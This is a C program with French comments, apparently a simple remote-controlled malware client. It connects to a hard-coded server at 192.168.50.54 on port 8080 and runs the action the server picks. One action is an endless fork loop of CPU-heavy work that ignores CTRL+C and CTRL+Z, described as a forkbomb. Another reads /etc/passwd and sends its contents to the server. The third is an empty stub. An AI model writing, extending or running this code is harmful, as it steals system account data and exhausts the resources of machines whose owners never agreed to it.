#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <limits.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <libgen.h>

#define PORT 8080

// Gestionnaire de signal pour ignorer CTRL+C et CTRL+Z
void signalHandler(int sig) {
    if (sig == SIGINT) {
        printf("CTRL+C détecté, mais ignoré\n");
    } else if (sig == SIGTSTP) {
        printf("CTRL+Z détecté, mais ignoré\n");
    }
}

// Fonction pour le forkbomb
void intensiveTask() {
    for (long i = 2; i < 1000000; i++) {
        int prime = 1;
        for (long j = 2; j < i; j++) {
            if (i % j == 0) {
                prime = 0;
                break;
            }
        }
    }
}

int main(int argc, char const *argv[]) {
    struct sockaddr_in serv_addr;
    int sock = 0;
    int server_choice;

    printf("Creating client socket...\n");
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    printf("Converting IPv4 address from text to binary...\n");
    if (inet_pton(AF_INET, "192.168.50.54", &serv_addr.sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        return -1;
    }

    printf("Attempting to connect to server...\n");
    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }

    printf("Connected to server. Waiting for data...\n");

    read(sock, &server_choice, sizeof(server_choice));
    printf("Server's choice received: %d\n", server_choice);

    switch (server_choice) {
        case 1:
            printf("You choose Forkbomb\n");
            // Associer SIGINT et SIGTSTP au gestionnaire de signal
            signal(SIGINT, signalHandler);
            signal(SIGTSTP, signalHandler);

            while (1) {
                pid_t pid = fork();

                if (pid == 0) {
                    printf("Child process with PID: %d\n", getpid());
                    intensiveTask();
                    exit(0);
                } else if (pid > 0) {
                    wait(NULL);
                } else {
                    perror("Fork error");
                    exit(EXIT_FAILURE);
                }
            }
            break;

        case 2:
            printf("Steel Passwd\n");

            FILE *passwdFile = fopen("/etc/passwd", "r");
            if (passwdFile == NULL) {
                perror("Error opening /etc/passwd");
                // Gérer l'erreur ici, par exemple, en envoyant un message d'erreur au serveur
            } else {
                char buffer[4096]; // Taille du tampon pour stocker le contenu du fichier
                size_t bytesRead;

                while ((bytesRead = fread(buffer, 1, sizeof(buffer), passwdFile)) > 0) {
                    // Envoyer le contenu du fichier au serveur
                    send(sock, buffer, bytesRead, 0);
                }

                fclose(passwdFile);
                printf("Sent /etc/passwd to the server\n");
            }
            break;

        case 3:
            printf("You chose Option 3\n");
            // Ajoutez ici le code pour l'option 3
            break;

        case 4:
            printf("Exiting the program...\n");
            break;

        default:
            printf("Invalid choice. Please enter a number between 1 and 4.\n");
    }

    close(sock);
    printf("Client socket closed.\n");

    return 0;
}